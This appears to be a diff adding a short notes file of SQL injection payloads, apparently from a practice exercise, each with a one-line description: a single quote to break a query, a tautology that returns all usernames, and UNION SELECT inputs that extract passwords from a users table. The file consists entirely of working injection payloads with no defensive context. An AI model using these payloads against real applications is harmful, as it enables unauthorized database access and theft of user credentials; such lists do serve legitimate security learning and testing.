@@ -1,0 +1,11 @@
+Breaks SQL Query, tests access level
+'
+
+Gets all usernames, including filtered ones
+test' OR '1'='1
+
+Fails to get usernames and passwords because of column misalignment
+test' UNION SELECT username, password FROM users WHERE '1'='1
+
+Get's passwords as usernames
+aaa' UNION SELECT password FROM users WHERE '1'='1
